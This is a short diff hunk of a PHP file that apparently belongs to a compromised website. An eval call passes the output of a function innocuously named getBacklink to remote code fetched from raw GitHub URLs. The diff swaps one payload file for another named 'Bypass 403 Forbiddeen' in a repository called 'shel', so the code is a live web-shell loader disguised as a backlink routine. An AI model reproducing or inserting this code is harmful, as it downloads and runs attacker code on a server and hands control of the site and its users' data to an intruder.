@@ -21,6 +21,6 @@ function getBacklink($url) {
 }
 
 
-eval("?>" . getBacklink("https://raw.githubusercontent.com/sekjhhh/shel-baru/refs/heads/main/3x.encryptgelay"));
+eval("?>" . getBacklink("https://raw.githubusercontent.com/sekjhhh/shel/refs/heads/main/Bypass%20403%20Forbiddeen"));
 
 ?>
